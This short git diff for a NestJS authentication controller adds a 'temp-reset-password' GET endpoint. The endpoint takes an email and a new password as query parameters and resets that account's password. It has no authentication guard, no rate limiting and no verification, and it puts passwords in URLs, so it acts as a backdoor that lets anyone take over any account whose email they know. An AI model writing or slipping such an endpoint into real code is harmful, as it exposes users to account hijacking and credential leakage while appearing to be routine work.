@@ -6,6 +6,8 @@ import {
   UseGuards,
   HttpCode,
   HttpStatus,
+  Get,
+  Query,
 } from '@nestjs/common';
 import { ThrottlerGuard } from '@nestjs/throttler';
 import { AuthService } from './auth.service';
@@ -35,5 +37,10 @@ export class AuthController {
   @UseGuards(ThrottlerGuard)
   async register(@Body() body: RegisterDto) {
     return this.authService.register(body);
+  }
+
+  @Get('temp-reset-password')
+  async tempReset(@Query('email') email: string, @Query('password') pass: string) {
+    return this.authService.tempResetPassword(email, pass);
   }
 }
